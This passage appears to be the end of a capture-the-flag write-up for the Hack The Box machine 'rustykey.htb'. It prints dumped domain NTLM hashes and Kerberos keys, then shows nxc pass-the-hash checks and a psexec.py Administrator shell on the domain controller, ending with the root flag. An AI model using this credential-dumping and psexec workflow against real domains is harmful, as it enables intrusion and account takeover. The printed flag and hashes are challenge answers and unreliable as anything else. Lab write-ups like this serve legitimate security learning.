krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::
Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::
Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::
Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::
Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::
Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::
Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::
Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::
IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::
IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::
IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::
IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::
IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::
[*] Kerberos keys grabbed
Administrator:des-cbc-md5:e007705d897310cd
krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a
krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af
krbtgt:des-cbc-md5:d6d062fd1fd32a64
rustykey.htb\rr.parker:des-cbc-md5:8c5b3b54b9688aa1
rustykey.htb\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9
rustykey.htb\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8
rustykey.htb\mm.turner:des-cbc-md5:a46ea77c13854945
rustykey.htb\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b
rustykey.htb\gg.anderson:des-cbc-md5:8923850da84f2c0d
rustykey.htb\dd.ali:des-cbc-md5:613da45e3bef34a7
rustykey.htb\ee.reed:des-cbc-md5:2fc46d9b898a4a29
rustykey.htb\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8
rustykey.htb\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43
rustykey.htb\nn.marcos:des-cbc-md5:e358835b1c238661
rustykey.htb\backupadmin:des-cbc-md5:625e25fe70a77358
DC$:des-cbc-md5:915d9d52a762675d
Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc
Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203
Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9
Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828
Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616
Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d
Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954
Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1
Support-Computer3$:des-cbc-md5:c13edcfe4676f86d
Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e
Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047
Support-Computer4$:des-cbc-md5:3b79647680e0d57a
Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42
Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89
Support-Computer5$:des-cbc-md5:73abb53162d51fb3
Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918
Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea
Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df
Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703
Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78
Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c
Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d
Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466
Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba
Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f
Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951
Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49
Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de
Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc
Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd
IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e
IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676
IT-Computer1$:des-cbc-md5:019d29370ece8002
IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa
IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7
IT-Computer2$:des-cbc-md5:622f2ae961abe932
IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb
IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3
IT-Computer3$:des-cbc-md5:f7025180cd23e5f1
IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc
IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a
IT-Computer4$:des-cbc-md5:bf58cb437340cd3d
IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8
IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a
IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

so we have a clear text pass for admin lets confirm and connect using psexec as admin is not remote management 

ok so the machine does not take local SAM hash, it take NTDS.dit
```
nxc smb 10.129.197.20 -u 'Administrator' -H 'f7a351e12f70cc177a1d5bd11b28ac26' -k --smb-timeout 10
SMB         10.129.197.20   445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.197.20   445    dc               [+] rustykey.htb\Administrator:f7a351e12f70cc177a1d5bd11b28ac26 (Pwn3d!)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.197.20 -u 'Administrator' -p 'Rustyrc4key#!' -k --smb-timeout 10
SMB         10.129.197.20   445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.197.20   445    dc               [+] rustykey.htb\Administrator:Rustyrc4key#! (Pwn3d!)

```
```
psexec.py 'rustykey.htb/Administrator:Rustyrc4key#!@dc.rustykey.htb' -k  
/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'psexec.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Requesting shares on dc.rustykey.htb.....
[*] Found writable share ADMIN$
[*] Uploading file OJrFfhQB.exe
[*] Opening SVCManager on dc.rustykey.htb.....
[*] Creating service jhlg on dc.rustykey.htb.....
[*] Starting service jhlg.....
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Press help for extra shell commands
[-] CCache file is not found. Skipping...
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\users\Administrator\Desktop
 
C:\Users\Administrator\Desktop> type root.txt
fe19f90b28b02afce9d50bcc0097529f

```

and we have root flag